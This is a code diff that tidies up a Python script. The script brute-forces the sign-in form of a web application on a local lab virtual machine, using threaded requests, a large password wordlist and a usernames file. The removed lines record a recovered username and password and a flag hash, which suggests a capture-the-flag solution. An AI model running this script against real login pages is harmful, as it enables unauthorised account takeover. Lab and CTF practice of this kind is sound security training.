@@ -1,47 +1,54 @@
+import os
+import threading
+from pathlib import Path
 from queue import Queue
-from lxml import etree
 
 import requests
-import threading
+from lxml import etree
 
-url = "http://192.168.122.118:80"
-params = {"page": "signin","Login": "Login"}
+VM_IP = os.environ.get("VM_IP", "192.168.122.118")
+url = f"http://{VM_IP}:80"
 
-passwords_file = open("1000000-password-seclists.txt", "r")
-usernames = open("usernames.txt", "r")
-queue = Queue(maxsize=10000)
+here = Path(__file__).parent
+passwords_file = open(here / "1000000-password-seclists.txt")
+usernames = open(here / "usernames.txt")
+
+queue: Queue = Queue(maxsize=10000)
 found = False
 
-def is_wrong(html):
+
+def is_wrong(html: str) -> bool:
     tree = etree.HTML(html)
-    image = tree.xpath('//div[@class="container"]/center/img/@src')[0]
-    return image == "images/WrongAnswer.gif"
+    image = tree.xpath('//div[@class="container"]/center/img/@src')
+    return bool(image) and image[0] == "images/WrongAnswer.gif"
 
 
-def try_login():
+def try_login() -> None:
     global found
     username, password = queue.get()
-    params["password"] = password.strip()
-    params["username"] = username.strip()
-    print(f"Trying username: {username.strip()} and password: {password.strip()}")
+    params = {
+        "page": "signin",
+        "Login": "Login",
+        "username": username.strip(),
+        "password": password.strip(),
+    }
     r = requests.get(url, params=params)
     if r.status_code == 200 and not is_wrong(r.text):
-        print(f"Found password for {username}: {password}")
+        print(f"Found: {username.strip()} / {password.strip()}")
         found = True
-        return True
-    return False
+    queue.task_done()
 
-def bruteforce():
+
+def bruteforce() -> None:
     for username in usernames:
         for password in passwords_file:
             if found:
-                queue.shutdown()
-                break
+                return
             queue.put((username, password))
-            threading.Thread(target=try_login).start()
+            threading.Thread(target=try_login, daemon=True).start()
+    queue.join()
+
 
 if __name__ == "__main__":
+    print(f"Brute-forcing {url} ...")
     bruteforce()
-
-# After less then 1 minute of bruteforcing, the password for user "Aaren" is found: "shadow".
-# Flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
